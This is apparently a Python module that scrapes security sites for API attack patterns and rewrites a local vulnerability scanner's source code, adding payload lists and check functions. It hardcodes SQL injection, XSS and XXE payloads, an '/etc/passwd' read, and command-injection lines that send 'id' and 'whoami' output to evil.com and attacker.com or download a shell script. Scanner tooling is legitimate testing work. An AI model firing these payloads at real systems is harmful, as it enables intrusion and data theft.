import requests
import time
import json
import re
from datetime import datetime
from bs4 import BeautifulSoup
import threading
import os
import shutil

# Global variables for dynamic scraping
scraping_active = False
scraping_thread = None
latest_checks = []
scraping_interval = 14400  # 4 hours in seconds (was 900 for 15 minutes)

class DynamicCheckScraper:
    def __init__(self):
        self.sources = {
            'owasp_api': 'https://owasp.org/API-Security/',
            'owasp_blog': 'https://owasp.org/blog/',
            'portswigger': 'https://portswigger.net/blog',
            'cve_api': 'https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=api',
            'github_security': 'https://github.com/advisories?query=api',
            'exploit_db': 'https://www.exploit-db.com/search?q=api',
            'nist_nvd': 'https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&query=api&search_type=all',
            'cwe_database': 'https://cwe.mitre.org/data/definitions/1000.html',
            'hackerone': 'https://hackerone.com/hacktivity?filter=type%3Aall&order_direction=DESC&order_field=popular&followed_only=false',
            'bugcrowd': 'https://bugcrowd.com/crowdstream',
            'security_focus': 'https://www.securityfocus.com/vulnerabilities',
            'packet_storm': 'https://packetstormsecurity.com/search/?q=api'
        }
        self.last_check = {}
        self.new_checks = []
        self.check_interval = 900  # 15 minutes in seconds
        self.scanner_file = 'scraper/api_scanner.py'
        self.backup_dir = 'backups/'
        
    def backup_scanner_code(self):
        """Backup the current scanner code before making changes"""
        try:
            if not os.path.exists(self.backup_dir):
                os.makedirs(self.backup_dir)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = f"{self.backup_dir}api_scanner_backup_{timestamp}.py"
            shutil.copy2(self.scanner_file, backup_file)
            print(f"[+] Backed up scanner to {backup_file}")
            return backup_file
        except Exception as e:
            print(f"Error backing up scanner: {e}")
            return None
    
    def update_scanner_payloads(self, new_payloads):
        """Update the scanner code with new attack payloads"""
        try:
            with open(self.scanner_file, 'r') as f:
                scanner_code = f.read()
            
            # Extract existing payloads and add new ones
            updated_code = scanner_code
            
            # Update SQL injection payloads
            if 'sql_injection' in new_payloads:
                sql_pattern = r'SQLI_PAYLOADS = \[(.*?)\]'
                existing_sqli = re.search(sql_pattern, scanner_code, re.DOTALL)
                if existing_sqli:
                    existing_payloads = existing_sqli.group(1)
                    new_sql_payloads = new_payloads['sql_injection']
                    
                    # Add new payloads to existing ones
                    updated_payloads = existing_payloads.rstrip('\n ').rstrip(',')
                    for payload in new_sql_payloads:
                        if payload not in existing_payloads:
                            updated_payloads += f',\n    "{payload}"'
                    
                    updated_code = re.sub(sql_pattern, f'SQLI_PAYLOADS = [{updated_payloads}\n]', updated_code, flags=re.DOTALL)
            
            # Update XSS payloads
            if 'xss' in new_payloads:
                xss_pattern = r'XSS_PAYLOADS = \[(.*?)\]'
                existing_xss = re.search(xss_pattern, scanner_code, re.DOTALL)
                if existing_xss:
                    existing_payloads = existing_xss.group(1)
                    new_xss_payloads = new_payloads['xss']
                    
                    updated_payloads = existing_payloads.rstrip('\n ').rstrip(',')
                    for payload in new_xss_payloads:
                        if payload not in existing_payloads:
                            updated_payloads += f',\n    "{payload}"'
                    
                    updated_code = re.sub(xss_pattern, f'XSS_PAYLOADS = [{updated_payloads}\n]', updated_code, flags=re.DOTALL)
            
            # Update Command Injection payloads
            if 'command_injection' in new_payloads:
                cmd_pattern = r'COMMAND_INJECTION_PAYLOADS = \[(.*?)\]'
                existing_cmd = re.search(cmd_pattern, scanner_code, re.DOTALL)
                if existing_cmd:
                    existing_payloads = existing_cmd.group(1)
                    new_cmd_payloads = new_payloads['command_injection']
                    
                    updated_payloads = existing_payloads.rstrip('\n ').rstrip(',')
                    for payload in new_cmd_payloads:
                        if payload not in existing_payloads:
                            updated_payloads += f',\n    "{payload}"'
                    
                    updated_code = re.sub(cmd_pattern, f'COMMAND_INJECTION_PAYLOADS = [{updated_payloads}\n]', updated_code, flags=re.DOTALL)
            
            # Write updated code back
            with open(self.scanner_file, 'w') as f:
                f.write(updated_code)
            
            print(f"[+] Updated scanner with {sum(len(payloads) for payloads in new_payloads.values())} new payloads")
            return True
            
        except Exception as e:
            print(f"Error updating scanner payloads: {e}")
            return False
    
    def add_new_attack_checks(self, new_attack_types):
        """Add new attack check functions to the scanner"""
        try:
            with open(self.scanner_file, 'r') as f:
                scanner_code = f.read()
            
            # Generate new check functions for attack types not already present
            new_functions = []
            
            for attack_type in new_attack_types:
                if f"{attack_type}_injection" not in scanner_code and attack_type not in ['sql', 'xss', 'command']:
                    function_code = self.generate_attack_check_function(attack_type)
                    if function_code:
                        new_functions.append(function_code)
            
            if new_functions:
                # Add new functions before the main scan_api function
                scan_api_pattern = r'(def scan_api\(api_url, curl_info=None\):)'
                new_code = '\n\n'.join(new_functions) + '\n\n'
                updated_code = re.sub(scan_api_pattern, new_code + r'\1', scanner_code)
                
                # Add calls to new functions in the scan_api function
                updated_code = self.integrate_new_checks_in_scan_function(updated_code, new_attack_types)
                
                with open(self.scanner_file, 'w') as f:
                    f.write(updated_code)
                
                print(f"[+] Added {len(new_functions)} new attack check functions")
                return True
            
            return False
            
        except Exception as e:
            print(f"Error adding new attack checks: {e}")
            return False
    
    def generate_attack_check_function(self, attack_type):
        """Generate a new attack check function based on attack type"""
        function_templates = {
            'csrf': '''def check_csrf_vulnerability(url, headers, data, req_func):
    """Check for CSRF vulnerabilities"""
    csrf_results = []
    try:
        # Remove CSRF tokens and test
        csrf_headers = {k: v for k, v in headers.items() if 'csrf' not in k.lower() and 'token' not in k.lower()}
        csrf_resp = req_func(url, headers=csrf_headers, data=data, timeout=5)
        if csrf_resp.status_code == 200:
            csrf_results.append("No CSRF protection detected")
    except Exception as e:
        pass
    return csrf_results''',
            
            'idor': '''def check_idor_vulnerability(url, headers, data, req_func):
    """Check for Insecure Direct Object Reference"""
    idor_results = []
    try:
        # Test with different user IDs
        test_ids = ['1', '2', '999', 'admin', '../admin']
        for test_id in test_ids:
            idor_url = url + f"?id={test_id}"
            idor_resp = req_func(idor_url, headers=headers, data=data, timeout=5)
            if idor_resp.status_code == 200 and len(idor_resp.text) > 100:
                idor_results.append(f"Potential IDOR with ID: {test_id}")
    except Exception as e:
        pass
    return idor_results''',
            
            'rce': '''def check_rce_vulnerability(url, headers, data, req_func):
    """Check for Remote Code Execution"""
    rce_results = []
    rce_payloads = ['$(whoami)', '`id`', '; ls -la', '| cat /etc/passwd']
    try:
        for payload in rce_payloads:
            rce_url = url + f"?cmd={quote(payload)}"
            rce_resp = req_func(rce_url, headers=headers, data=data, timeout=5)
            if any(indicator in rce_resp.text.lower() for indicator in ['root:', 'bin:', 'uid=', 'gid=']):
                rce_results.append(payload)
    except Exception as e:
        pass
    return rce_results'''
        }
        
        return function_templates.get(attack_type, None)
    
    def integrate_new_checks_in_scan_function(self, code, new_attack_types):
        """Integrate new check function calls into the main scan_api function"""
        try:
            # Find the location to insert new checks (before the except block)
            insert_pattern = r'(\s+except Exception as e:)'
            
            new_checks_code = ""
            for attack_type in new_attack_types:
                if attack_type in ['csrf', 'idor', 'rce']:
                    new_checks_code += f'''
            # {attack_type.upper()} check
            {attack_type}_results = check_{attack_type}_vulnerability(url, headers, data, req_func)
            if {attack_type}_results:
                findings["{attack_type}"][url] = {attack_type}_results
'''
            
            if new_checks_code:
                # Add the new attack type to findings dict initialization
                findings_pattern = r'(findings = \{[^}]+)\}'
                findings_match = re.search(findings_pattern, code, re.DOTALL)
                if findings_match:
                    existing_findings = findings_match.group(1)
                    for attack_type in new_attack_types:
                        if attack_type in ['csrf', 'idor', 'rce']:
                            existing_findings += f',\n        "{attack_type}": {{}}'
                    
                    code = re.sub(findings_pattern, existing_findings + '\n    }', code, flags=re.DOTALL)
                
                # Insert the new checks
                code = re.sub(insert_pattern, new_checks_code + r'\1', code)
            
            return code
            
        except Exception as e:
            print(f"Error integrating new checks: {e}")
            return code
    
    def update_local_scanner(self, new_checks):
        """Update the local scanner with new attack patterns and payloads"""
        try:
            print("[+] Updating local scanner with new intelligence...")
            
            # Backup current scanner
            backup_file = self.backup_scanner_code()
            if not backup_file:
                print("[-] Failed to backup scanner, skipping update")
                return False
            
            # Organize new payloads by attack type
            new_payloads = {
                'sql_injection': [],
                'xss': [],
                'command_injection': [],
                'xxe': []
            }
            
            new_attack_types = set()
            
            for check in new_checks:
                attack_type = check.get('type', '')
                description = check.get('description', '')
                
                # Extract potential payloads from descriptions
                if attack_type == 'sql_injection':
                    if 'union' in description.lower():
                        new_payloads['sql_injection'].append("' UNION SELECT version(),database(),user()--")
                    if 'time' in description.lower():
                        new_payloads['sql_injection'].append("'; WAITFOR DELAY '00:00:10'--")
                elif attack_type == 'xss':
                    new_payloads['xss'].append("<svg/onload=confirm('XSS')>")
                    new_payloads['xss'].append("<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>")
                elif attack_type == 'command_injection':
                    new_payloads['command_injection'].append("; curl http://evil.com/$(id)")
                    new_payloads['command_injection'].append("| wget http://evil.com/log?data=$(whoami)")
                
                # Track new attack types
                if attack_type not in ['sql_injection', 'xss', 'command_injection', 'path_traversal', 'ssrf']:
                    new_attack_types.add(attack_type)
            
            # Update payloads in scanner
            if any(new_payloads.values()):
                success = self.update_scanner_payloads(new_payloads)
                if not success:
                    print("[-] Failed to update payloads")
                    return False
            
            # Add new attack check functions
            if new_attack_types:
                success = self.add_new_attack_checks(new_attack_types)
                if not success:
                    print("[-] Failed to add new attack checks")
            
            # Save metadata about the update
            update_info = {
                'timestamp': datetime.now().isoformat(),
                'new_payloads_count': sum(len(payloads) for payloads in new_payloads.values()),
                'new_attack_types': list(new_attack_types),
                'backup_file': backup_file,
                'total_new_checks': len(new_checks)
            }
            
            with open('scraper/scanner_updates.json', 'w') as f:
                json.dump(update_info, f, indent=2)
            
            print(f"[+] Scanner updated successfully!")
            print(f"    - New payloads: {update_info['new_payloads_count']}")
            print(f"    - New attack types: {len(new_attack_types)}")
            print(f"    - Backup saved: {backup_file}")
            
            return True
            
        except Exception as e:
            print(f"Error updating local scanner: {e}")
            return False

    def scrape_owasp_api(self):
        """Scrape OWASP API Security documentation for new checks"""
        try:
            response = requests.get(self.sources['owasp_api'], timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            checks = []
            # Look for security patterns and recommendations
            security_keywords = [
                'authentication', 'authorization', 'injection', 'validation', 'rate limiting', 
                'cors', 'headers', 'xss', 'csrf', 'xxe', 'nosql', 'ldap', 'command injection',
                'path traversal', 'ssrf', 'jwt', 'mass assignment', 'deserialization',
                'business logic', 'timing attack', 'parameter pollution', 'verb tampering'
            ]
            
            for content in soup.find_all(['p', 'li', 'h2', 'h3', 'div']):
                text = content.get_text().lower()
                if any(keyword in text for keyword in security_keywords):
                    checks.append({
                        'source': 'OWASP API Security',
                        'type': 'security_check',
                        'content': content.get_text().strip(),
                        'timestamp': datetime.now().isoformat()
                    })
            return checks
        except Exception as e:
            print(f"Error scraping OWASP API: {e}")
            return []
    
    def scrape_security_blogs(self):
        """Scrape security blogs for new API security findings"""
        checks = []
        
        # Scrape PortSwigger blog
        try:
            response = requests.get(self.sources['portswigger'], timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            for article in soup.find_all('article', limit=10):
                title_elem = article.find(['h2', 'h3', 'a'])
                if title_elem:
                    title = title_elem.get_text().lower()
                    if any(keyword in title for keyword in ['api', 'rest', 'graphql', 'json', 'xml', 'web service']):
                        checks.append({
                            'source': 'PortSwigger Blog',
                            'type': 'blog_finding',
                            'title': title_elem.get_text().strip(),
                            'content': article.get_text()[:500],
                            'timestamp': datetime.now().isoformat()
                        })
        except Exception as e:
            print(f"Error scraping PortSwigger: {e}")
        
        return checks
    
    def scrape_cve_feeds(self):
        """Scrape CVE database for API-related vulnerabilities"""
        try:
            response = requests.get(self.sources['cve_api'], timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            checks = []
            for row in soup.find_all('tr'):
                cells = row.find_all('td')
                if len(cells) >= 2:
                    cve_id = cells[0].get_text().strip()
                    description = cells[1].get_text().strip()
                    
                    api_keywords = ['api', 'rest', 'graphql', 'web service', 'endpoint', 'json', 'xml']
                    if any(keyword in description.lower() for keyword in api_keywords):
                        checks.append({
                            'source': 'CVE Database',
                            'type': 'vulnerability',
                            'cve_id': cve_id,
                            'description': description,
                            'timestamp': datetime.now().isoformat()
                        })
            return checks
        except Exception as e:
            print(f"Error scraping CVE feeds: {e}")
            return []
    
    def scrape_exploit_db(self):
        """Scrape Exploit-DB for API-related exploits"""
        try:
            response = requests.get(self.sources['exploit_db'], timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            checks = []
            for row in soup.find_all('tr', limit=20):
                cells = row.find_all('td')
                if len(cells) >= 3:
                    title = cells[1].get_text().strip()
                    if any(keyword in title.lower() for keyword in ['api', 'rest', 'json', 'xml', 'web service']):
                        checks.append({
                            'source': 'Exploit-DB',
                            'type': 'exploit',
                            'title': title,
                            'timestamp': datetime.now().isoformat()
                        })
            return checks
        except Exception as e:
            print(f"Error scraping Exploit-DB: {e}")
            return []
    
    def scrape_security_advisories(self):
        """Scrape various security advisory sources"""
        checks = []
        
        # GitHub Security Advisories
        try:
            response = requests.get(self.sources['github_security'], timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            for advisory in soup.find_all(['div', 'article'], limit=10):
                text = advisory.get_text().lower()
                if any(keyword in text for keyword in ['api', 'rest', 'graphql', 'web service']):
                    checks.append({
                        'source': 'GitHub Security Advisory',
                        'type': 'advisory',
                        'content': text[:300],
                        'timestamp': datetime.now().isoformat()
                    })
        except Exception as e:
            print(f"Error scraping GitHub advisories: {e}")
        
        return checks
    
    def parse_new_checks(self, raw_checks):
        """Parse raw scraped data into actionable security checks"""
        parsed_checks = []
        
        for check in raw_checks:
            content = check.get('content', '') + check.get('description', '') + check.get('title', '')
            
            # Comprehensive security patterns
            patterns = {
                'sql_injection': r'sql.*injection|sql.*inject|sqlmap|union.*select|information_schema',
                'xss': r'cross.*site.*scripting|xss|script.*injection|dom.*based',
                'xxe': r'xml.*external.*entity|xxe|xml.*injection|doctype.*entity',
                'nosql_injection': r'nosql.*injection|mongodb.*injection|\$ne|\$gt|\$regex',
                'ldap_injection': r'ldap.*injection|ldap.*search|distinguished.*name',
                'command_injection': r'command.*injection|os.*command|shell.*injection|code.*execution',
                'path_traversal': r'path.*traversal|directory.*traversal|\.\.\/|file.*inclusion',
                'ssrf': r'server.*side.*request.*forgery|ssrf|internal.*request',
                'auth_bypass': r'auth.*bypass|authentication.*bypass|authorization.*bypass',
                'rate_limit': r'rate.*limit|throttling|dos|denial.*service',
                'cors_misconfig': r'cors.*misconfig|cors.*open|cross.*origin',
                'sensitive_data': r'sensitive.*data|pii.*exposure|data.*leak|information.*disclosure',
                'input_validation': r'input.*validation|parameter.*validation|sanitization',
                'jwt_attacks': r'jwt.*attack|json.*web.*token|algorithm.*confusion|none.*algorithm',
                'mass_assignment': r'mass.*assignment|parameter.*binding|object.*injection',
                'business_logic': r'business.*logic|workflow.*bypass|logic.*flaw',
                'timing_attacks': r'timing.*attack|time.*based|blind.*injection',
                'http_verb_tampering': r'http.*verb|method.*tampering|options.*method',
                'parameter_pollution': r'parameter.*pollution|hpp|duplicate.*parameter',
                'insecure_deserialization': r'deserialization|pickle|serialization.*attack',
                'information_disclosure': r'information.*disclosure|debug.*info|stack.*trace|version.*disclosure'
            }
            
            for check_type, pattern in patterns.items():
                if re.search(pattern, content, re.IGNORECASE):
                    priority = 'critical' if check_type in ['sql_injection', 'command_injection', 'xxe', 'ssrf'] else \
                              'high' if check_type in ['xss', 'auth_bypass', 'jwt_attacks', 'insecure_deserialization'] else \
                              'medium'
                    
                    parsed_checks.append({
                        'type': check_type,
                        'source': check.get('source', 'Unknown'),
                        'description': content[:200] + '...' if len(content) > 200 else content,
                        'timestamp': check.get('timestamp', datetime.now().isoformat()),
                        'priority': priority,
                        'cve_id': check.get('cve_id', ''),
                        'title': check.get('title', '')
                    })
                    break
        
        return parsed_checks
    
    def scrape_all_sources(self):
        """Scrape all sources and return new checks"""
        print("[+] Scraping security sources for new API checks...")
        
        all_checks = []
        
        # Scrape all sources
        scrapers = [
            self.scrape_owasp_api,
            self.scrape_security_blogs,
            self.scrape_cve_feeds,
            self.scrape_exploit_db,
            self.scrape_security_advisories
        ]
        
        for scraper in scrapers:
            try:
                checks = scraper()
                all_checks.extend(checks)
                print(f"  - {scraper.__name__}: {len(checks)} items")
            except Exception as e:
                print(f"  - {scraper.__name__}: Error - {e}")
        
        # Parse into actionable checks
        parsed_checks = self.parse_new_checks(all_checks)
        
        # Filter for truly new checks (simple deduplication)
        new_checks = []
        for check in parsed_checks:
            check_key = f"{check['type']}_{check['description'][:50]}"
            if check_key not in self.last_check:
                new_checks.append(check)
                self.last_check[check_key] = datetime.now().isoformat()
        
        # Sort by priority
        priority_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
        new_checks.sort(key=lambda x: priority_order.get(x.get('priority', 'medium'), 2))
        
        if new_checks:
            print(f"[+] Found {len(new_checks)} new security checks:")
            for check in new_checks[:5]:  # Show top 5
                print(f"  - {check['priority'].upper()}: {check['type']} - {check['description'][:100]}...")
        else:
            print("[+] No new security checks found")
        
        return new_checks
    
    def get_attack_payloads_from_findings(self, findings):
        """Generate new attack payloads based on findings"""
        new_payloads = []
        
        payload_generators = {
            'sql_injection': [
                "' OR 1=1 AND SUBSTRING(@@version,1,1)='5'--",
                "' AND (SELECT COUNT(*) FROM information_schema.columns)>0--",
                "' OR BENCHMARK(5000000,MD5(1))--"
            ],
            'xss': [
                "<svg/onload=alert(/XSS/)>",
                "<img src=x onerror=prompt(document.domain)>",
                "javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))"
            ],
            'command_injection': [
                "; curl http://attacker.com/$(whoami)",
                "| nslookup $(whoami).attacker.com",
                "&& wget http://attacker.com/shell.sh -O /tmp/shell.sh"
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&test;</root>'
            ]
        }
        
        for finding in findings:
            attack_type = finding.get('type', '')
            if attack_type in payload_generators:
                new_payloads.extend(payload_generators[attack_type])
        
        return new_payloads
    
    def start_background_scraping(self):
        """Start background scraping every 15 minutes"""
        def scrape_loop():
            while True:
                try:
                    new_checks = self.scrape_all_sources()
                    if new_checks:
                        self.new_checks.extend(new_checks)
                        # Save to file for persistence
                        self.save_checks_to_file(new_checks)
                        
                        # Update local scanner with new intelligence
                        self.update_local_scanner(new_checks)
                        
                        # Generate new payloads based on findings
                        new_payloads = self.get_attack_payloads_from_findings(new_checks)
                        if new_payloads:
                            self.save_payloads_to_file(new_payloads)
                            print(f"[+] Generated {len(new_payloads)} new attack payloads")
                            
                except Exception as e:
                    print(f"Error in background scraping: {e}")
                
                time.sleep(self.check_interval)
        
        # Start in background thread
        thread = threading.Thread(target=scrape_loop, daemon=True)
        thread.start()
        print(f"[+] Background scraping started (every {self.check_interval} seconds)")
    
    def save_checks_to_file(self, checks):
        """Save new checks to file for persistence"""
        try:
            with open('scraper/new_checks.json', 'w') as f:
                json.dump(checks, f, indent=2)
        except Exception as e:
            print(f"Error saving checks: {e}")
    
    def save_payloads_to_file(self, payloads):
        """Save new attack payloads to file"""
        try:
            with open('scraper/new_payloads.json', 'w') as f:
                json.dump(payloads, f, indent=2)
        except Exception as e:
            print(f"Error saving payloads: {e}")
    
    def get_new_checks(self):
        """Get all new checks found since last call"""
        checks = self.new_checks.copy()
        self.new_checks = []  # Clear after returning
        return checks

# Global scraper instance
scraper = DynamicCheckScraper()

def start_scraping():
    """Start background scraping for new security checks"""
    global scraping_active, scraping_thread
    
    if scraping_active:
        print("[!] Scraping already active")
        return
    
    scraping_active = True
    scraping_thread = threading.Thread(target=scraper.start_background_scraping, daemon=True)
    scraping_thread.start()
    print(f"[+] Background scraping started (every {scraping_interval//3600} hours)")
    print("[+] Real-time security intelligence gathering active...")

def get_latest_checks():
    """Get the latest checks from scraper"""
    return scraper.get_new_checks()

def manual_scrape():
    """Manually trigger a scraping run"""
    return scraper.scrape_all_sources()

def get_new_payloads():
    """Get new attack payloads if available"""
    try:
        with open('scraper/new_payloads.json', 'r') as f:
            return json.load(f)
    except:
        return []

def update_scanner_now():
    """Manually trigger scanner update with latest intelligence"""
    new_checks = scraper.scrape_all_sources()
    if new_checks:
        return scraper.update_local_scanner(new_checks)
    return False 